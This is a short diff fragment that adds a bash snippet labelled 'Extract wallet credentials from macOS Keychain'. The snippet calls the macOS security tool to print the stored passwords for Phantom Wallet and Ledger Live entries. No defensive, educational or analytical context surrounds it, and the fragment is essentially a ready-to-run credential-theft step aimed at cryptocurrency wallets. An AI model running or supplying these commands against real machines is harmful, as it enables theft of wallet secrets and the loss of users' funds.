@@ -1,0 +1,5 @@
+```bash
+# Extract wallet credentials from macOS Keychain
+security find-generic-password -s "Phantom Wallet" -w
+security find-generic-password -s "Ledger Live" -w
+```
